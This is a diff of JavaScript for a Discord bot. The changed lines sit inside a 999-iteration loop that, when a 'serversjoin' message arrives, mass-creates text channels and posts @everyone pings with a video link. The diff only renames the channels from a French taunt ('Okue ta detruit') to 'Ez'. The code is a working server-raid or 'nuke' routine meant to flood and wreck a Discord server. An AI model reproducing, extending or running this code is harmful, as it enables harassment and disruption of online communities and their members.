@@ -246,12 +246,12 @@ if(message.content.includes("serversjoin")){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue ta detruit", "text").then(c => c.send("@everyone ."))
-                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
-                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789."))
-                          message.guild.createChannel("Okue ta detruit", "text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4  &.789 ."))
-                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
-                          message.guild.createChannel("Okue ta detruit","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
+                          message.guild.createChannel("Ez", "text").then(c => c.send("@everyone ."))
+                          message.guild.createChannel("Ez","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
+                          message.guild.createChannel("Ez","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789."))
+                          message.guild.createChannel("Ez", "text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4  &.789 ."))
+                          message.guild.createChannel("Ez","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
+                          message.guild.createChannel("Ez","text").then(c => c.send("@everyone https://cdn.discordapp.com/attachments/703336711777812552/704368336900718662/video0.mp4 &.789 ."))
 
                       }
                     }
